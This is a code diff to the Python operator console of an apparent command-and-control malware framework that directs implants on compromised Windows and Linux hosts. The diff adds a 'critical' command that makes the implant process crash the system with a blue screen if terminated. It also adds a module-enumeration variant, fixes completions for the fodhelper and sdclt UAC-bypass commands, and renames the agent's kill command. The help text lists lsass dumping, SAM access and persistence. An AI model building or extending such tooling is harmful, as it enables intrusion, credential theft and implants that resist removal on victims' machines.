@@ -79,6 +79,7 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'upload': None,
     'pstree': None,
     'modules': None,
+    'modules_full': None,
     'checksec': None,
     'software': None,
     'windows': None,
@@ -99,8 +100,8 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
         'spe': None
     },
     'uac': {
-        'fodhelper',
-        'sdclt'
+        'fodhelper': None,
+        'sdclt': None
     },
     'lsass': {
         'examine': None,
@@ -113,9 +114,13 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'assembly': None,
     'msgbox': None,
     'speak': None,
+    'critical': {
+        'true': None,
+        'false': None
+    },
     'sleep': None,
     'collect': None,
-    'kill': None,
+    'die': None,
     'show': None,
     'back': None,
     'cls': None,
@@ -132,7 +137,7 @@ agent_completer_linux = NestedCompleter.from_nested_dict({
     },
     'sleep': None,
     'collect': None,
-    'kill': None,
+    'die': None,
     'show': None,
     'back': None,
     'cls': None,
@@ -143,7 +148,8 @@ agent_completer_linux = NestedCompleter.from_nested_dict({
 elevated_commands = [
     "lsass",
     "sam",
-    "persis-spe"
+    "persist-spe",
+    "critical"
 ]
 
 
@@ -202,7 +208,8 @@ def print_agent_help(os):
     checksec                               ->  Enum security products
     software                               ->  Enum installed software
     windows                                ->  Enum visible windows
-    modules                                ->  Enum process loaded modules
+    modules                                ->  Enum process loaded modules (exclude Microsoft Dlls)
+    modules_full                           ->  Enum process loaded modules (include Microsoft Dlls)
     
     --== Collection Stuff ==--
     clipboard                              ->  Retrieve clipboard
@@ -237,11 +244,14 @@ def print_agent_help(os):
     msgbox <title> <text>                  ->  Pop a message box in a new thread
     speak <text>                           ->  Speak a string using the microphone
     
+    --== Misc stuff ==--
+    critical <true/false>                  -> Set process critical (BSOD on termination) (elevation required)
+
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
     clear                                  ->  Clear pending commands
     collect                                ->  Recollect agent data
-    kill                                   ->  Kill the agent (persistence will still take place)
+    die                                   ->  Kill the agent
     
     --== General ==--
     show                                   ->  Show agent details
@@ -269,7 +279,7 @@ def print_agent_help(os):
     sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
     clear                                  ->  Clear pending commands
     collect                                ->  Recollect agent data
-    kill                                   ->  Kill the agent
+    die                                   ->  Kill the agent
     
     --== General ==--
     show                                   ->  Show agent details
@@ -329,7 +339,7 @@ def agent_screen_windows(agent_id):
                 }
 
             # handle ps_modules
-            elif re.fullmatch(r"\s*(pstree|software|modules)\s*", command):
+            elif re.fullmatch(r"\s*(pstree|software|modules|modules_full)\s*", command):
                 ps_module = command.replace(" ", "")
                 powershell_command = getattr(ps_modules, ps_module)
                 encoded_powershell_command = utils.encode_base_64(powershell_command)
@@ -495,6 +505,13 @@ def agent_screen_windows(agent_id):
                     "command_type": "speak",
                     "text": text
                 }
+            
+            elif re.fullmatch(r"\s*critical\s+(true|false)\s*", command):   
+                is_critical = shlex.split(re.sub(r"\s*critical\s+", "", command, 1))[0]
+                command_dict = {
+                    "command_type": "critical",
+                    "is_critical": is_critical,
+                }
 
             elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
                 args = re.sub(r"\s*sleep\s+", "", command, 1)
@@ -510,9 +527,9 @@ def agent_screen_windows(agent_id):
                 listener.agents[agent_id]["pending_commands"] = []
                 continue
 
-            elif re.fullmatch(r"\s*kill\s*", command):
+            elif re.fullmatch(r"\s*die\s*", command):
                 command_dict = {
-                    "command_type": "kill"
+                    "command_type": "die"
                 }
 
             elif re.fullmatch(r"\s*collect\s*", command):
@@ -627,9 +644,9 @@ def agent_screen_linux(agent_id):
                 listener.agents[agent_id]["pending_commands"] = []
                 continue
 
-            elif re.fullmatch(r"\s*kill\s*", command):
+            elif re.fullmatch(r"\s*die\s*", command):
                 command_dict = {
-                    "command_type": "kill"
+                    "command_type": "die"
                 }
 
             elif re.fullmatch(r"\s*collect\s*", command):
